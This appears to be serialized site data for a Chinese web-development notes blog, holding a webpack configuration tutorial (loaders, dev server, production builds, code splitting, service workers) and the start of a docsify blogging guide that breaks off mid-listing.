webpack.optimize.CommonsChunkPlugin({\n       name: 'common' // 指定公共 bundle 的名称。\n    })\n]\n\n\n1\n2\n3\n4\n5\n\n\n当然，代码分离还有 import()语法 和 require.ensure 方案；可以使用 webpack-visualizer 工具来检查哪些模块占用空间哪些可能是重复使用的。\n\n缓存：在项目版本更新时，不是所有的资源都要更新的，旧的没有改变的要使用缓存。\n\nCommonsChunkPlugin 其实还有一个功能：在每次修改后的构建结果中，将webpack的 样板 和 manifest 提取出来。样板(boilerplate) 指 webpack 运行时的引导代码；manifest：当编译器(compiler)开始执行、解析和映射应用程序时，它会保留所有模块的详细要点，这些数据集合称为manifest。\n\nplugins: [\n    new webpack.optimize.CommonsChunkPlugin({\n       name: 'manifest' // 指定公共 manifest 的名称。\n    })\n]\n\n\n1\n2\n3\n4\n5\n\n\n那么被提出来的manifest会生成类似manifest.719796322be98041fff2.js的bundle文件，还有第三方库例如lodash 或 react，也可以通过 新入口entry配合CommonsChunkPlugin 来将它们提取到一个bundle文件里，这样就能减少从服务端资源的获取。\n\nentry: {\n    main: './src/index.js',\n    vendor: [\n       'lodash'\n    ]\n},\nplugins: [\n    new webpack.optimize.CommonsChunkPlugin({\n       name: 'vendor' // 必须在manifest之前\n    })\n    new webpack.optimize.CommonsChunkPlugin({\n       name: 'manifest'\n    })\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n当我们添加新的函数时，vendor、manifest和main这三个bundle的hash其实都会改变，其中main的hash的改变当然是因为它本身新增内容了，manifest的改变也自然是因为内部新增了一个模块，而vendor是因为前面的module.id增加了一个（会基于默认的解析顺序进行增量，就像是bundle中函数的索引），使用 HashedModuleIdsPlugin 可以解决vendor的问题。\n\nplugins: [\n    new HashedModuleIdsPlugin() // 解决添加新的函数时vendor的hash值会变的问题，建议用于生产环境\n]\n\n\n1\n2\n3\n\n\n\n# 处理全局变量和函数\n\n引入第三方的库之后会提供一些全局变量给开发者使用，而webpack是为了让代码模块化，减少模块之间的隐式依赖。使用 ProvidePlugin，编译每个模块时在遇到该全局变量就会获取对应的package包，在其他模块中使用这个全局变量时就会引用并使用这个package包。\n\nplugins: [\n    new webpack.ProvidePlugin({\n        _: 'lodash' // _和lodash就类似于$和jQuery\n    })\n]\n\n\n1\n2\n3\n4\n5\n\n\n如果要使用第三方库的多个导出函数，将ProvidePlugin中的参数的字符串形式改为路径数组形式，例如[module, child, ...children?]\n\nplugins: [\n    new webpack.ProvidePlugin({\n        join: ['lodash', 'join'] // 使用lodash中的join方法，还有的话数组里继续加\n    })\n]\n\n\n1\n2\n3\n4\n5\n\n\n这样的ProvidePlugin使用法再配合树摇，就可以剔除第三方库中未被引用的导出函数。除了使用 ProvidePlugin 之外，还可以使用 exports-loader 将一个全局变量作为一个普通的模块来导出。\n\nmodule: {\n    rules: [{\n        test: require.resolve('globals.js'),\n        use: 'exports-loader?file,parse=helpers.parse' // 将file全局变量和helpers.parse全局函数导出来\n    }]\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 离线程序\n\n将web应用做成离线程序，可以使用 Service Workers 的网络技术，对应在webpack中是使用 workbox-webpack-plugin 插件，npm install workbox-webpack-plugin --save-dev。\n\nplugins: [\n    new WorkboxPlugin.GenerateSW({\n        // 这些选项帮助 ServiceWorkers 快速启用\n        // 不允许遗留任何“旧的” ServiceWorkers\n        clientsClaim: true,\n        skipWaiting: true\n    })\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n打包时会生成一个sw.js，继续为程序注册serviceWorker\n\nimport _ from 'lodash';\nimport printMe from './print.js';\n\nif ('serviceWorker' in navigator) {\n    window.addEventListener('load', () => {\n        // 注册serviceWorker\n        navigator.serviceWorker.register('/sw.js').then(registration => {\n            console.log('SW registered: ', registration);\n        }).catch(registrationError => {\n            console.log('SW registration failed: ', registrationError);\n        });\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 公共路径\n\n像一些资源的使用，在开发环境中是assets目录下，在生产环境就可能是CDN这种形式，那么就需要一个公共路径变量。\n\nimport webpack from 'webpack';\n\n// 如果预先定义过环境变量，就将其赋值给`ASSET_PATH`变量，否则赋值为根目录\nconst ASSET_PATH = process.env.ASSET_PATH || '/';\n\nexport default {\n  output: {\n    publicPath: ASSET_PATH\n  },\n\n  plugins: [\n    // 该插件帮助我们安心地使用环境变量\n    new webpack.DefinePlugin({\n      'process.env.ASSET_PATH': JSON.stringify(ASSET_PATH)\n    })\n  ]\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n另一个可能出现的情况是，我们需要即时设置公共路径。webpack 提供一个全局变量供你设置，它名叫 webpack_public_path。所以在你的项目入口(import之后使用)，你可以简单地设置如下：\n\n__webpack_public_path__ = process.env.ASSET_PATH;\n\n\n1\n\n\n\n# 一些报错\n\n * Error: Cannot find module 'webpack-cli/bin/config-yargs'，这个问题是webpack和webpack-cli版本不兼容，可以将webpack-cli版本降一个主版本安装即可。\n\n * TypeError: CleanWebpackPlugin is not a constructor，这个问题是因为clean-webpack-plugin的导出改成了export { CleanWebpackPlugin }所以在使用时就得是这样const { CleanWebpackPlugin } = require('clean-webpack-plugin');\n\n * bundle.js文件没生成，可能是出口写错了，也可能是你正在使用webpack-dev-server。",normalizedContent:"# webpack的使用\n\n官方文档：https://www.webpackjs.com/concepts/\n\n\n# 什么是webpack\n\nwebpack是js应用程序的静态模块打包器(module bundler)。它会将应用程序的资源文件当成一个个模块，根据模块之间的依赖关系递归处理它们，构建一个依赖关系图(dependency graph)，最后将应用程序需要的每个模块打包成一个或多个bundle。\n\n\n# 安装使用\n\n 1. 下载并安装node.js，然后在命令行工具里输入npm init来创建package.json，在之前的npm的使用有讲过。\n 2. 输入npm install --save-dev webpack@<version>来局部安装webpack。\n 3. 继续输入npm install --save-dev webpack-cli来局部安装webpack的命令工具。\n 4. 新建webpack.config.js配置文件，这个就是项目中webpack的关键所在。\n\n\n# 入口entry\n\n入口entry：webpack构建的起点入口，会从这里递归处理它所有依赖的模块并开始打包。\n\n 1. 单入口写法：\n    \n    const config = {\n        entry: {\n            main: './src/main.ts'\n        }\n    };\n    // 上面的简写\n    const config1 = {\n        entry: './src/main.ts'\n    };\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 2. 数组形式的多入口写法：\n    \n    const config = {\n        entry: ['./src/main.ts', './test/test.ts']\n    };\n    \n    \n    1\n    2\n    3\n    \n\n 3. 对象形式的多入口写法：\n    \n    // 分离 应用程序(app) 和 第三方库(vendor) 入口\n    const config = {\n        entry: {\n            app: './src/app.js',\n            vendors: './src/vendors.js'\n        }\n    };\n    // 多页面应用程序\n    const config1 = {\n        entry: {\n            pageone: './src/pageone/index.js',\n            pagetwo: './src/pagetwo/index.js',\n            pagethree: './src/pagethree/index.js'\n        }\n    };\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n\n# 出口output\n\n出口output：指定webpack最后将打包好的文件存放在哪里，并怎么命名。\n\nconst config = {\n  output: {\n    filename: 'bundle.js',              // 打包文件的命名\n    path: '/home/proj/public/assets'    // 存放地址\n  }\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\n多入口对应的出口处理：\n\nconst config = {\n  entry: {\n    app: './src/app.js',\n    search: './src/search.js'\n  },\n  output: {\n    filename: '[name].js',      // 使用占位符(substitutions)来确保每个文件具有唯一的名称\n    path: __dirname + '/dist'   // __dirname是当前webpack.config.js所在的路径，拼接上dist\n  }\n};                              // 更高级的拼接是path.join，或者使用path.resolve将后面的参数处理成目标路径\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 模式mode\n\n模式mode：为webpack提供模式配置的优化，有两个值development和production\n\n设置为development或production都会创建一个全局变量process.env.node_env，用于区分应用程序的环境是开发环境还是生产环境。\n\n设置为development，会启用namedchunksplugin和namedmodulesplugin。namedchunksplugin的作用就是给每个chunks进行命名，方便开发人员来查找打包后的文件；namedmodulesplugin也是类似的作用，会给某个打包的模块进行命名，有一个独一无二的key方便开发人员调试。\n\nmodule.exports = {\n+ mode: 'development'\n- plugins: [\n-   new webpack.namedmodulesplugin(),   // 对打包后的模块进行命名\n-   new webpack.namedchunksplugin(),    // 对打包后的chunks进行命名\n-   new webpack.defineplugin({ \"process.env.node_env\": json.stringify(\"development\") }), // 添加全局变量node_env\n- ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n设置为production，会启用flagdependencyusageplugin（标记没有用到的依赖）, flagincludedchunksplugin（给当前chunk包含的chunkid加入chunk名之中）, moduleconcatenationplugin（作用域提升，打包成闭包，达到预编译的目的）, noemitonerrorsplugin（忽略错误信息，将其他正确的信息正确输出到output）, occurrenceorderplugin（按照调用次数来给chunks排序）, sideeffectsflagplugin（如果当前的模块没有被引用，而且package.json中的sideeffects为false，那么打包的时候就可以将此模块剔除） 和 uglifyjsplugin（混淆压缩）。\n\nmodule.exports = {\n+  mode: 'production',\n-  plugins: [\n-    new uglifyjsplugin(/* ... */),\n-    new webpack.defineplugin({ \"process.env.node_env\": json.stringify(\"production\") }),\n-    new webpack.optimize.moduleconcatenationplugin(),\n-    new webpack.noemitonerrorsplugin()\n-  ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 转换loader\n\n转换loader：使用webpack对模块源代码进行转换，可以将所有类型的文件转换为webpack能够处理的有效模块。\n\n 1. css loader\n    安装 style-loader 和 css-loader，npm install --save-dev style-loader css-loader\n    配置：在webpack.config.js文件里配置module中的rules，use: ['style-loader', 'css-loader']\n    注意：use属性里style-loader要放在css-loader前\n    \n     {\n        test: /\\.css$/, // test属性用于标识出应该被对应的loader进行转换的某个或某些文件\n        use: ['style-loader', 'css-loader'] // use属性表示进行转换时应该使用的哪个loader\n     }\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. less loader\n    安装 less-loader 和 less，npm install --save-dev less-loader less\n    配置：在webpack.config.js文件里配置module中的rules，use: ['style-loader', 'css-loader', 'less-loader']\n    \n     {\n         test: /\\.less$/,\n         use: ['style-loder', 'css-loader', 'less-loader']\n     }\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. sass loader\n    安装 sass-loader 和 node-sass，npm install --save-dev sass-loader node-sass\n    配置：在webpack.config.js文件里配置module中的rules，use: ['style-loader', 'css-loader', 'sass-loader']\n    注意：还可以写成use: [{loader: 'style-loader'}, {loader: 'css-loader'}, {loader: 'sass-loader'}]\n\n 4. postcss loader 自动加上浏览器前缀\n    安装postcss-loader和autoprefixer，npm install --save-dev postcss-loader autoprefixer\n    配置：在webpack.config.js文件里配置module中的rules\n    \n     {\n         test: /\\.scss$/,\n         use: ['style-loader', 'css-loader', 'sass-loader', {\n             loader: \"postcss-loader\",   // 添加浏览器前缀，压缩 css\n             options: {\n                 plugins: [\n                     require(\"autoprefixer\")\n                     ({\n                         browsers: [\n                             'ie >= 8', // ie版本大于等于ie8\n                             'firefox >= 20', // 火狐浏览器大于20版本\n                             'safari >= 5', // safari大于5版本\n                             'android >= 4', // 安卓版本大于4\n                             'ios >= 6', // ios版本大于ios6\n                             'last 4 version' // 浏览器最新的四个版本\n                         ]\n                     })\n                 ]\n             }\n         }]\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 5. file loader 文件处理 安装 file-loader，npm install --save-dev file-loader 选项配置： name:为你的文件配置自定义文件名模板(默认[hash].[ext]) context:配置自定义文件的上下文，默认为webpack.config.js所在的位置 publicpath:为你的文件配置自定义public发布目录 outputpath:为你的文件配置自定义output输出目录 [ext]:资源扩展名 [name]:资源的基本名称 [path]:资源相对于context的路径 [hash]:内容的哈希值\n    \n     {\n         test: /\\.(png|jpg|gif|jpeg|svg)$/,\n         use: [{\n             loader: 'file-loader',\n             options: {\n                 name: '[path]xxx.jpg', // path是该图片实际的位置（相对于上下文）\n                 context: '../', // 指定上下文\n                 publicpath: 'https://www.abc.com/img', // 用于cdn\n                 outputpath: './img', // 直接打包生成在bin/img目录下了而不是bin/[path]了\n                 name: '[hash]xxx.jpg' // hash值\n             }\n         }]\n     }, {\n         test: /\\.(ttf|woff|woff2|eot)$/,\n         use: [{\n             loader: 'file-loader',\n             options: {\n                 outputpath: './font'\n             }\n         }]\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 6. babel loader es6转es5 安装 babel-loader(负责es6语法转换)、babel-core(babel核心包)、babel-preset-env(告诉babel使用哪种转码规则进行 文件处理)，npm install babel-loader @babel/core @babel/preset-env --save-dev\n    \n     {\n         test: /\\.js$/,\n         exclude: /node_modules/, // 或者include: path.resolve(__dirname, \"src/js\"),指定位置提高构建效率\n         use: [{\n             loader: 'babel_loader',\n             options: {\n                 preset: ['@babel/preset-env']\n             }\n         }]\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 7. ts loader 安装 typescript、ts-loader，npm install --save-dev typescript ts-loader。\n    \n     {\n         test: /\\.tsx?$/,\n         use: 'ts-loader',\n         exclude: /node_modules/\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n    \n    其实ts的使用还要配置tsconfig.json，其中target设置为“es5”意思是编译到es5，还有sourcemap改为true，再配合webpack的devtool: 'inline-source-map'就可以在开发环境上调试了。\n\n 8. csv xml loader 安装 csv-loader、xml-loader，npm install --save-dev csv-loader xml-loader\n    \n     {\n         test: /\\.(csv|tsv)$/,\n         use: [\n             'csv-loader'\n         ]\n     },{\n         test: /\\.xml$/,\n         use: [\n            'xml-loader'\n         ]\n     }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n\n# webpack-dev-server\n\nwebpack-dev-server用来配置本地服务器的，使用它可以为webpack打包生成的资源文件提供web服务，还有自动刷新和热替换(hmr)。\n\n安装webpack-dev-server使用的是npm install --save-dev webpack-dev-server。\n\n在webpack.config.js写上devserver配置\n\ndevserver: {\n    contentbase: path.join(__dirname, \"bin\"), // 设置服务器访问的基本目录\n    host: 'localhost', // 服务器的ip地址\n    port: 8080, // 端口号\n    open: true, // webpack运行服务器时自动打开页面\n    hot: true // 热更新开关\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n在package.json的scripts里添加配置\n\n\"scripts\": {\n    \"webpack-dev-server\": \"webpack-dev-server --mode development\"\n}\n\n\n1\n2\n3\n\n\n在开启热更新后（只能开发环境使用），还要在插件中添加 namedmodulesplugin 和 hotmodulereplacementplugin 插件，以便更容易查看要修补(patch)的依赖。\n\nplugins: [\n    new webpack.namedmodulesplugin(),\n    new webpack.hotmodulereplacementplugin()\n]\n\n\n1\n2\n3\n4\n\n\n\n# 树摇tree shaking\n\n树摇tree shaking：代码中有一些未被引用的模块，webpack可以在打包过程中将其剔除，就像将树上枯萎的叶子摇落下来。使用它的原因就是生产打包后的代码包体会减小，对于项目的优化比较重要。\n\n在 package.json 里设置sideeffects: false会告知webpack可以放心安全地删除未用到的export导出，但是项目确实有一些这样未使用的模块但又不想删除它，那就是可以将sideeffects设置为一个数组：\n\n\"sideeffects\": [\n    \"./src/some-side-effectful-file.js\"\n]\n\n\n1\n2\n3\n\n\n当然，在 webpack.config.js 里也能设置可以存在的未使用模块，在打包后不会被删除：\n\nmodule.rules: [\n  {\n    include: path.resolve(\"node_modules\", \"lodash\"),\n    sideeffects: false\n  }\n]\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 生产环境构建\n\n生产环境不同于开发环境，它需要的bundle要小、source map要轻量还有更优化的资源，那么建议单独为生产环境配置一个config，或者说将项目的webpack配置分为“通用”、“开发”和“生产”三种，然后使用 webpack-merge 工具将其合并。\n\n安装 webpack-merge，npm install --save-dev webpack-merge，然后创建webpack.common.js、webpack.dev.js和webpack.prod.js三个文件。最后还要修改package.json，而且require进来的插件也要安装一下。\n\npackage.json：\n\n\"scripts\": {\n    \"serve\": \"webpack-dev-server --open --config webpack.dev.js --mode development\",\n    \"build:dev\": \"webpack --open --config webpack.dev.js --mode development\",\n    \"build:pro\": \"webpack --config webpack.prod.js --mode production\",\n},\n\n\n1\n2\n3\n4\n5\n\n\nwebpack.common.js：\n\nconst path = require('path');\nconst { cleanwebpackplugin } = require('clean-webpack-plugin');\nconst htmlwebpackplugin = require('html-webpack-plugin');\n\nmodule.exports = {\n    entry: { app: './src/index.js' }, // 入口\n    output: {\n        filename: '[name].bundle.js', // 出口的文件名，[name]就是入口中使用的名字\n        path: path.resolve(__dirname, 'dist') // 处理输出位置\n    },\n    module: {\n        rules: [{ // 使用tsloader\n            test: /\\.tsx?$/,\n            use: 'ts-loader',\n            exclude: /node_modules/\n        }]\n    },\n    resolve: {\n        extensions: ['.tsx', '.ts', '.js']\n    },\n    plugins: [\n        new cleanwebpackplugin({ // 打包生成dist前会自动删除dist下的文件，使用npm脚本“rm -rf ./dist”也可以\n            cleanoncebeforebuildpatterns: ['dist']\n        }),\n        new htmlwebpackplugin({ // 用于生成入口html（存于dist），然后会自动引入打包好的bundle.js\n            title: 'production',\n            template: './index.html' // 模板，webpack生成html时用到的模板，比如模板里要挂载vue。\n        })\n    ]\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nwebpack.dev.js：\n\nconst path = require('path');\nconst { merge } = require('webpack-merge');\nconst common = require('./webpack.common.js');\n\nmodule.exports = merge(common, {\n    devtool: 'inline-source-map',   // 开发环境所使用的sourcemap\n    devserver: { // webpack-dev-server\n        contentbase: path.resolve(__dirname, 'dist'), // 设置服务器访问的基本目录\n        host: 'localhost', // 服务器的ip地址\n        port: 8080, // 端口号\n        open: true // webpack运行服务器时自动打开页面\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nwebpack.prod.js：\n\nconst webpack = require('webpack');\nconst merge = require('webpack-merge');\nconst uglifyjsplugin = require('uglifyjs-webpack-plugin');\nconst common = require('./webpack.common.js');\n\nmodule.exports = merge(common, {\n    devtool: 'source-map', // 用于生产的sourcemap\n    plugins: [\n        // 代码混淆压缩，当然你也可以考虑使用babelminifywebpackplugin或closurecompilerplugin\n        new uglifyjsplugin({\n            sourcemap: true // 用于生产的sourcemap\n        }),\n        // 为项目设置环境变量，指定环境为生产环境，打包出的bundle会小很多。\n        // 也可以在package.json里加上--env.node_env=production，但是得把env传到webpack.prod.js里来，将对象改为函数\n        new webpack.defineplugin({\n            'process.env.node_env': json.stringify('production')\n        })\n    ]\n  });\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 代码分离和缓存\n\n代码分离：因为入口 chunks 之间可能包含重复的模块，并会被加载到不同的bundle里，那么就得对重复的模块从原有的文件中分离出来。\n\nplugins: [\n    new webpack.optimize.commonschunkplugin({\n       name: 'common' // 指定公共 bundle 的名称。\n    })\n]\n\n\n1\n2\n3\n4\n5\n\n\n当然，代码分离还有 import()语法 和 require.ensure 方案；可以使用 webpack-visualizer 工具来检查哪些模块占用空间哪些可能是重复使用的。\n\n缓存：在项目版本更新时，不是所有的资源都要更新的，旧的没有改变的要使用缓存。\n\ncommonschunkplugin 其实还有一个功能：在每次修改后的构建结果中，将webpack的 样板 和 manifest 提取出来。样板(boilerplate) 指 webpack 运行时的引导代码；manifest：当编译器(compiler)开始执行、解析和映射应用程序时，它会保留所有模块的详细要点，这些数据集合称为manifest。\n\nplugins: [\n    new webpack.optimize.commonschunkplugin({\n       name: 'manifest' // 指定公共 manifest 的名称。\n    })\n]\n\n\n1\n2\n3\n4\n5\n\n\n那么被提出来的manifest会生成类似manifest.719796322be98041fff2.js的bundle文件，还有第三方库例如lodash 或 react，也可以通过 新入口entry配合commonschunkplugin 来将它们提取到一个bundle文件里，这样就能减少从服务端资源的获取。\n\nentry: {\n    main: './src/index.js',\n    vendor: [\n       'lodash'\n    ]\n},\nplugins: [\n    new webpack.optimize.commonschunkplugin({\n       name: 'vendor' // 必须在manifest之前\n    })\n    new webpack.optimize.commonschunkplugin({\n       name: 'manifest'\n    })\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n当我们添加新的函数时，vendor、manifest和main这三个bundle的hash其实都会改变，其中main的hash的改变当然是因为它本身新增内容了，manifest的改变也自然是因为内部新增了一个模块，而vendor是因为前面的module.id增加了一个（会基于默认的解析顺序进行增量，就像是bundle中函数的索引），使用 hashedmoduleidsplugin 可以解决vendor的问题。\n\nplugins: [\n    new hashedmoduleidsplugin() // 解决添加新的函数时vendor的hash值会变的问题，建议用于生产环境\n]\n\n\n1\n2\n3\n\n\n\n# 处理全局变量和函数\n\n引入第三方的库之后会提供一些全局变量给开发者使用，而webpack是为了让代码模块化，减少模块之间的隐式依赖。使用 provideplugin，编译每个模块时在遇到该全局变量就会获取对应的package包，在其他模块中使用这个全局变量时就会引用并使用这个package包。\n\nplugins: [\n    new webpack.provideplugin({\n        _: 'lodash' // _和lodash就类似于$和jquery\n    })\n]\n\n\n1\n2\n3\n4\n5\n\n\n如果要使用第三方库的多个导出函数，将provideplugin中的参数的字符串形式改为路径数组形式，例如[module, child, ...children?]\n\nplugins: [\n    new webpack.provideplugin({\n        join: ['lodash', 'join'] // 使用lodash中的join方法，还有的话数组里继续加\n    })\n]\n\n\n1\n2\n3\n4\n5\n\n\n这样的provideplugin使用法再配合树摇，就可以剔除第三方库中未被引用的导出函数。除了使用 provideplugin 之外，还可以使用 exports-loader 将一个全局变量作为一个普通的模块来导出。\n\nmodule: {\n    rules: [{\n        test: require.resolve('globals.js'),\n        use: 'exports-loader?file,parse=helpers.parse' // 将file全局变量和helpers.parse全局函数导出来\n    }]\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 离线程序\n\n将web应用做成离线程序，可以使用 service workers 的网络技术，对应在webpack中是使用 workbox-webpack-plugin 插件，npm install workbox-webpack-plugin --save-dev。\n\nplugins: [\n    new workboxplugin.generatesw({\n        // 这些选项帮助 serviceworkers 快速启用\n        // 不允许遗留任何“旧的” serviceworkers\n        clientsclaim: true,\n        skipwaiting: true\n    })\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n打包时会生成一个sw.js，继续为程序注册serviceworker\n\nimport _ from 'lodash';\nimport printme from './print.js';\n\nif ('serviceworker' in navigator) {\n    window.addeventlistener('load', () => {\n        // 注册serviceworker\n        navigator.serviceworker.register('/sw.js').then(registration => {\n            console.log('sw registered: ', registration);\n        }).catch(registrationerror => {\n            console.log('sw registration failed: ', registrationerror);\n        });\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 公共路径\n\n像一些资源的使用，在开发环境中是assets目录下，在生产环境就可能是cdn这种形式，那么就需要一个公共路径变量。\n\nimport webpack from 'webpack';\n\n// 如果预先定义过环境变量，就将其赋值给`asset_path`变量，否则赋值为根目录\nconst asset_path = process.env.asset_path || '/';\n\nexport default {\n  output: {\n    publicpath: asset_path\n  },\n\n  plugins: [\n    // 该插件帮助我们安心地使用环境变量\n    new webpack.defineplugin({\n      'process.env.asset_path': json.stringify(asset_path)\n    })\n  ]\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n另一个可能出现的情况是，我们需要即时设置公共路径。webpack 提供一个全局变量供你设置，它名叫 webpack_public_path。所以在你的项目入口(import之后使用)，你可以简单地设置如下：\n\n__webpack_public_path__ = process.env.asset_path;\n\n\n1\n\n\n\n# 一些报错\n\n * error: cannot find module 'webpack-cli/bin/config-yargs'，这个问题是webpack和webpack-cli版本不兼容，可以将webpack-cli版本降一个主版本安装即可。\n\n * typeerror: cleanwebpackplugin is not a constructor，这个问题是因为clean-webpack-plugin的导出改成了export { cleanwebpackplugin }所以在使用时就得是这样const { cleanwebpackplugin } = require('clean-webpack-plugin');\n\n * bundle.js文件没生成，可能是出口写错了，也可能是你正在使用webpack-dev-server。",charsets:{cjk:!0}},{title:"使用docsify写blog",frontmatter:{},regularPath:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8docsify%E5%86%99blog.html",relativePath:"book-web/常用工具/使用docsify写blog.md",key:"v-daa52cfc",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8docsify%E5%86%99blog.html",headers:[{level:2,title:"为什么使用docsify",slug:"为什么使用docsify",normalizedTitle:"为什么使用docsify",charIndex:21},{level:2,title:"docsify的使用",slug:"docsify的使用",normalizedTitle:"docsify的使用",charIndex:174},{level:2,title:"期望的项目目录结构",slug:"期望的项目目录结构",normalizedTitle:"期望的项目目录结构",charIndex:1818},{level:2,title:"docsify的基本配置",slug:"docsify的基本配置",normalizedTitle:"docsify的基本配置",charIndex:2739},{level:2,title:"封面的使用",slug:"封面的使用",normalizedTitle:"封面的使用",charIndex:5910},{level:2,title:"导航栏的使用",slug:"导航栏的使用",normalizedTitle:"导航栏的使用",charIndex:6448},{level:2,title:"侧边栏的使用",slug:"侧边栏的使用",normalizedTitle:"侧边栏的使用",charIndex:6815},{level:2,title:"插件的使用",slug:"插件的使用",normalizedTitle:"插件的使用",charIndex:7371},{level:2,title:"部署博客/书籍",slug:"部署博客-书籍",normalizedTitle:"部署博客/书籍",charIndex:7818},{level:2,title:"常见问题",slug:"常见问题",normalizedTitle:"常见问题",charIndex:7939}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"为什么使用docsify docsify的使用 期望的项目目录结构 docsify的基本配置 封面的使用 导航栏的使用 侧边栏的使用 插件的使用 部署博客/书籍 常见问题",content:'# 使用docsify写blog\n\n\n# 为什么使用docsify\n\n * docsify只需要一个index.html静态文件，不会再生成多余的静态文件，非常简便。\n * 插件可以直接使用cdn，也可以将插件相关的js、css、images直接放到项目下，无需npm下载。\n * 配置简单，也足以支撑最简单的文档网页，自己操作空间很大。\n\n\n# docsify的使用\n\n * 在一个完全新的项目里使用docsify，比如是个空的blog项目：\n   \n   1. 使用npm：首先得会使用npm，查看之前写的“Npm的使用”。\n   \n   2. 初始化新项目：使用git init和npm init来初始化新项目，会生成.git和package.json。\n   \n   3. 局部安装docsify：运行npm i docsify-cli局部安装docsify，再编辑package.json里的scripts如下。\n      \n      {\n          // 添加npm运行脚本\n          "scripts": {\n            "init": "docsify init ./docs",\n            "dev": "docsify serve ./docs"\n          },\n      }\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      \n   \n   4. 使用docsify初始化docs：运行npm run init，docsify就会在新项目里生成docs文件夹，该文件夹里有index.html、.nojekyll和README.md。\n   \n   5. 使用docsify预览docs内容：运行npm run dev，就能看到docs文件夹里的内容（最初是docs/README.md）显示在了http://localhost:3000里。\n   \n   6. 新增.gitignore：给这个新项目新增.gitignore文件，在里面添加node_modules、.git、.vscode等。\n\n * 如果是在现有项目里使用docsify，也就是给现有项目新增docs说明文档，或者改造docs说明文档：\n   \n   1. 因为是现有项目，新建一个分支，不用使用git init和npm init来初始化现有项目了。如果是改造docs说明文档，那就将现有项目这个新分支里的docs文件夹剪切到外面进行一个备份。\n   \n   2. 局部安装docsify：运行npm i docsify-cli会在现有项目新分支下局部安装docsify，再编辑package.json里的scripts如下。\n      \n      {\n          // 添加npm运行脚本，除了npm和git以外，所有的blog相关的都在docs目录下\n          "scripts": {\n            "init": "docsify init ./docs",\n            "dev": "docsify serve ./docs"\n          },\n      }\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      \n   \n   3. 使用docsify初始化docs：运行npm run init，docsify会在现有项目新分支下生成docs文件夹，该文件夹里有index.html、.nojekyll和README.md。\n   \n   4. 使用docsify预览docs内容：运行npm run dev，就能看到docs文件夹里的内容（最初是docs/README.md）显示在了http://localhost:3000里。\n   \n   5. 修改.gitignore：修改现有项目的.gitignore文件，在里面添加node_modules、.git、.vscode等。\n   \n   6. 准备在这个项目的docs里写项目说明，或者是将之前备份的docs里的内容移到现在的新docs里。\n\n\n# 期望的项目目录结构\n\nProjectName（例如blog，也可以是xxx-react，只要保证docs是真正的文档入口目录即可）\n  ├──docs （docsify作用于这个文件夹，也是部署在GitHub Pages上的目录）\n  │   ├──book-sketches （自定义博客内容，例如生活部分）\n  │   │       └──_sidebar.md （book-sketches里所有md文件组成的目录）\n  │   ├──book-web （自定义博客内容，例如web部分）\n  │   │       └──_sidebar.md （book-web里所有md文件组成的目录）\n  │   ├──public （存放博客系统的公共资源，也可以放本地插件）\n  │   │   ├──image （博客系统的公共图片资源）\n  │   │   │   ├──bg.png （封面背景图）\n  │   │   │   └──favicon.ico （网站页签图标icon）\n  │   │   └──library （插件虽然是cdn形式，以防万一，在本地存一份）\n  │   ├──_coverpage.md （博客系统的封面）\n  │   ├──_navbar.md （博客系统的导航栏）\n  │   ├──.nojekyll （解决名字为下划线开头的文件在GitHub上的报错）\n  │   ├──index.html （博客系统的入口文件，存放一些配置，引入一些插件等）\n  │   ├──README.md （博客系统的HomePage主页）\n  │   